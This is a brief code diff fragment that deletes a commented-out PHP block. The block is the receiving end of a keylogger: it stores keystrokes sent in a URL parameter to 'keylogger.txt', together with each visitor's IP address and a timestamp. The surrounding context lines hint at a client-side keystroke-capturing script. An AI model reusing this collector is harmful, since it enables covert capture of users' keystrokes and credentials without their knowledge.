@@ -23,15 +23,4 @@ if(keys != '') {
 
 }, 100);
 
-// <?php
-// 
-//     date_default_timezone_set(PRC);
-//     $from = $_SERVER['REMOTE_ADDR'];
-//     $time = date("Y-m-d G:i:s");
-
-// if(!empty($_GET['c'])) {
-// 	$key = $_GET['c']; 
-// 	file_put_contents('./keylogger.txt', $key.' | '.$time.' | '.$from."\r\n", FILE_APPEND);
-// }
-// ?>
 
